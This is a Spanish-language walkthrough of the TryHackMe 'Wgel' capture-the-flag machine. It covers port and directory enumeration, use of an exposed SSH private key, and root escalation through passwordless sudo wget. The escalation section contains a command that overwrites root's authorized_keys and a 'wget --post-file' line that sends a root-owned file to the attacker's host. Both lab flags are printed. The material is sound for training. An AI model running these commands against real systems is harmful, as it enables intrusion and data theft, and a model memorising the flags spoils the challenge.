# Wgel CTF

### tags: `Try Hack Me` `Linux` `SSH` `sudo` `wget`

## **FLAGS:**

* User Flag: 057c67131c3d5e42dd5cd3075b198ff6
* Root Flag: b1b968b37519ad1daa6408188649263d

## **USERS:**

* Jessie

## **ENUMERACIÓN**

1. Vemos si el host esta levantado y saber el SSOO \(**Linux**: TTL &lt;= 64\) `ping -c1 IP`
2. Escaneamos los puertos abiertos
   * Primero vemos si va muy lento el escaneo: `nmap -p- --open -T5 -v -n IP`

     ```text
       -p-        Todos los puertos
       --open     Mostrar solos puertos abiertos
       -T5        Modo más agresivo
       -v         Modo verbose (reporta por pantalla)
       -n        No aplicar resolución DNS
     ```

   * Como va lento, lanzamos este otro comando: `nmap -sS --min-rate 5000 -p- -vvv -n -Pn IP`

     ```text
       -sS        Realizar un TCP SYN port scan
       --min-rate    Emitir al menos 5000 paquetes por segundo
       -Pn        No realizar Host Discovery
     ```

     * Va más rápido y encuentra los puertos 22 \(SSH\) y 80 \(HTTP\)

       ![](https://i.imgur.com/Kaxg51I.png)
3. Obtenemos los servicios que corren en los puertos `nmap -sC -sV -p22,80 IP`

   ![](https://i.imgur.com/lyGd7i2.png)

4. Nos centramos en el servidor web Apache. Lanzamos un whatweb para ver si usa algún CMS tipo Wordpress, pero vemos que no, es un Apache normal

   ![](https://i.imgur.com/p8AOFkK.png)

5. Accedemos al portal web y vemos la página por defecto de apache. Inspeccionamos el código fuente por si hay algo raro. Vemos un comentario interesante:

   ![](https://i.imgur.com/fEOhhMG.png)

   Tenemos un posible usuario: **Jessie**

6. Vamos a hacer un fuzzing en el portal para encontrar alguna ruta con GoBuster

   `gobuster dir -u IP -w DICT -q -n -e`

   ```text
        -u        Target 
        -w         Diccionario (/usr/share/wordlists/dirb/common.txt)
        -q        Silencioso, no muestra mensajes de estado           
        -n        No muestra códigos de estado        
        -e        Muestra URLs completas
   ```

   ![](https://i.imgur.com/QRMEw6K.png)

7. Vemos un path **/sitemap**. Al acceder, vemos una especie de blog. Dice algo de "unapp". Lo buscamos y vemos que es una [plantilla](https://colorlib.com/wp/template/unapp/) para hacer webs.

   ![](https://i.imgur.com/etXh7eb.png)

   * Buscamos vulnerabilidades sobre unapp pero no hay nada.

8. Lanzamos un fuzzing sobre **IP/sitemap**:

   ![](https://i.imgur.com/eO9ibpM.png)

   * Vemos un directorio .ssh interesante. Al entrar hay una clave privada RSA. Nos la descargamos.

     ![](https://i.imgur.com/Ykjsfbh.png)

## **GET A SHELL**

Probamos a utilizar la llave privada encontrada con el usuario **Jessie** por SSH:

`ssh -i id_rsa jessie@IP`

![](https://i.imgur.com/qi1w86L.png)

## **USER FLAG**

Buscamos la flag en su directorio home. La encontramos en Documents:

![](https://i.imgur.com/fIPw2ru.png)

Tenemos la user flag: **057c67131c3d5e42dd5cd3075b198ff6**

## **ROOT FLAG**

Vamos a intentar una escalada de privilegios en Linux siguiendo este [tutorial](https://jieliau.medium.com/privilege-escalation-on-linux-platform-8b3fbd0b1dd4). También podemos lanzar este [script](https://github.com/rebootuser/LinEnum) para enumerar el sistema.

1. En primer lugar, intentamos ver los privilegios de sudo del usuario jessie. Ejecutamos `sudo -l`.

   ![](https://i.imgur.com/i4FmAtp.png)

   * Vemos que puede ejecutar todo como sudo con password \(no la tenemos\) y **/usr/bin/wget** sin password.

2. Seguimos esta [guia](https://gtfobins.github.io/gtfobins/wget/#sudo) para escalar privilegios. Podriamos seguir está [otra guía](https://vk9-sec.com/wget-privilege-escalation/) pero no tenemos la password de Jessie tampoco.
3. Vamos a copiar el contenido del fichero **authorized\_keys** de **/home/jessie** y subirlo al directorio **/root**.
   * Primero vemos el fichero en la máquina y nos lo copiamos en un fichero local del kali:

     &lt;img src=[https://i.imgur.com/OqfwGqk.png](https://i.imgur.com/OqfwGqk.png) width=1200/&gt;

   * Luego, levantamos un servidor con Python para compartir el fichero:

     `python -m SimpleHTTPServer 8888`

   * Finalmente, cargamos el fichero en la máquina con:

     `sudo wget IP:8888/keys -O /root/.ssh/authorized_keys`

     ![](https://i.imgur.com/rSFze0t.png)

   * No funciona porque no existe el directorio **/root/.ssh**
4. Probamos directamente a descargar la flag de root tal como explicaba en esta [otra guía](https://vk9-sec.com/wget-privilege-escalation/).

   `sudo /usr/bin/wget –post-file=/root/root.txt IP`

   &lt;img src=[https://i.imgur.com/9VS624X.png](https://i.imgur.com/9VS624X.png) width=1200/&gt;

   * Falla con root.txt y probamos con root\_flag.txt \(como la de user\).

     Tenemos la root flag: **b1b968b37519ad1daa6408188649263d**

